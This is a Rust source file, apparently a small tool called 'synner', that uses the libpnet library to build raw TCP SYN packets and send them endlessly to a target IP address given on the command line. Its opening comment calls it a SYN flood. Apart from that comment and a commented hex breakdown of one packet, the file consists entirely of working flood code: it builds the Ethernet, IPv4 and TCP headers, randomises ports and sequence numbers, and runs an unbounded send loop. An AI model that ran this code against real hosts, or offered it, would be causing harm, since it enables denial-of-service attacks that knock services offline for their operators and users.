// Following snippet uses libpnet to send a TCP SYN packet
// to a user-specified target (think SYN flood). However
// currently the Ethernet SRC/DST MACs are hard-coded
// and thus won't probably just work without tinkering.

extern crate rand;
extern crate pnet;
extern crate pnet_packet;
extern crate pnet_datalink;
extern crate pnet_transport;


use std::env;
use std::net::{Ipv4Addr};

use pnet::util::{MacAddr};
use pnet_packet::tcp::{MutableTcpPacket, TcpFlags, TcpOption};
use pnet_packet::ethernet::{MutableEthernetPacket, EtherTypes};
use pnet_packet::ip::{IpNextHeaderProtocols};
use pnet_packet::ipv4::{MutableIpv4Packet, Ipv4Flags};
use pnet_datalink::{Channel, NetworkInterface};


fn print_help() {
    println!("Usage: synner destination_ip interface_name");
}


fn parse_arguments() -> Result<(Ipv4Addr, String), &'static str>{
    let args: Vec<String> = env::args().collect();

    match args.len() {
        1 => {
            print_help();
            Err("Too few arguments")
        },
        2 => {
            print_help();
            Err("Too few arguments")
        },
        3 => {
            let dst_ip = args[1].parse::<Ipv4Addr>().unwrap();
            let iface = args[2].to_string();
            Ok((dst_ip, iface))
        },
        _ => {
            print_help();
            Err("Too many arguments")
        }
    }
}

fn build_random_packet(destination_ip: &Ipv4Addr) -> Option<[u8; 66]> {
    const ETHERNET_HEADER_LEN: usize = 14;
    const TCP_HEADER_LEN: usize = 32;
    const IPV4_HEADER_LEN: usize = 20;

    let mut tmp_packet = [0u8; ETHERNET_HEADER_LEN + IPV4_HEADER_LEN + TCP_HEADER_LEN];
    
    // Setup Ethernet Header
    {
        let mut eth_header = MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(MacAddr::new(8, 0, 39, 203, 157, 11));
        eth_header.set_source(MacAddr::new(10, 0, 39, 0, 0, 12));
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    // Setup IP header
    {
        let mut ip_header = MutableIpv4Packet::new(&mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)]).unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(52);
        ip_header.set_fragment_offset(16384);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(Ipv4Addr::new(192, 168, 33, 1));
        ip_header.set_destination(destination_ip.clone());
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(128);
        ip_header.set_version(4);
        ip_header.set_flags(Ipv4Flags::DontFragment);

        let checksum = pnet_packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);           
    }

    // Setup TCP header
    {
        let mut tcp_header = MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

        tcp_header.set_source(rand::random::<u16>());
        tcp_header.set_destination(rand::random::<u16>());

        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(64240);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(rand::random::<u32>());

        tcp_header.set_options(&vec![TcpOption::wscale(8), TcpOption::sack_perm(), TcpOption::mss(1460), TcpOption::nop(), TcpOption::nop()]);

        let checksum = pnet_packet::tcp::ipv4_checksum(&tcp_header.to_immutable(), &Ipv4Addr::new(192, 168, 33, 1), &destination_ip);
        tcp_header.set_checksum(checksum);        
    }

    Some(tmp_packet)    
}

fn send_tcp_packet(destination_ip: Ipv4Addr, interface: String) {
    // Packet Hex Representation
    //
    // 0x00, 0x90, 0x7f, 0x98, 0x12, 0xe1, // Destination MAC
    // 0x48, 0x4d, 0x7e, 0x9c, 0x79, 0x4b, // Source MAC
    // 0x08, 0x00,                         // Type (IPv4)
    // 0x45,                               // IPv4 Header Length
    // 0x00,                               // Explicit Congestion Notification (no clue what this is)
    // 0x00, 0x34,                         // Total length
    // 0x56, 0x05,                         // Identification (not sure either)
    // 0x40, 0x00,                         // Fragment offset (set to Don't Fragment/DF)
    // 0x80,                               // TTL (Time to Live)
    // 0x06,                               // Protocol (TCP)
    // 0xd0, 0x7e,                         // Header checksum with validation disabled
    // 0xac, 0x12, 0x82, 0x44              // Source IP (172.18.130.68)
    // 0xac, 0x12, 0x82, 0x44              // Destination IP set to be the same for testing,
    // 0xd7, 0x06,                         // TCP Source Port (55046)
    // 0x01, 0xbb,                         // TCP Destination Port (443)
    // 0x29, 0x7b, 0xbc, 0x17              // TCP Sequence Number (seq; generally random)
    // 0x00, 0x00, 0x00, 0x00,             // TCP ACK set to 0
    // 0x80, 0x02,                         // TCP Flags (only SYN set, which is bit 2)
    // 0xfa, 0xf0,                         // TCP Window size value (64240)
    // 0xe1, 0x8a,                         // TCP checksum
    // 0x00, 0x00,                         // TCP urgent pointer set to 0
    // 0x02, 0x04, 0x05, 0xb4,             // TCP Options: MSS Flag, Length and MSS size (1460 bytes)
    // 0x01,                               // TCP No-Operation (NOP) flag
    // 0x03, 0x03, 0x08,                   // TCP Wiundow scale (8) multiply by 256
    // 0x01,                               // TCP No-Operation (NOP) flag (why duplicate?)            
    // 0x01,                               // TCP No-Operation (NOP) flag (why duplicate?)            
    // 0x04, 0x02                          // TCP Option SACK permitted   

    let interfaces = pnet_datalink::interfaces();
    println!("{:?}", &interfaces);

    let interfaces_name_match = |iface: &NetworkInterface| iface.name == interface;
    let interface = interfaces
        .into_iter()
        .filter(interfaces_name_match)
        .next()
        .unwrap();

    let (mut tx, _) = match pnet_datalink::channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };

    let mut count = 0;

    loop {
        count += 1;
        tx.send_to(&build_random_packet(&destination_ip).unwrap().to_vec(), None);

        if &count % 10000 == 0 {
            println!("Sent packet #{}", &count);
        }        
    }
}


fn main() {
    let parsed_args = parse_arguments().unwrap();
    send_tcp_packet(parsed_args.0, parsed_args.1);
}
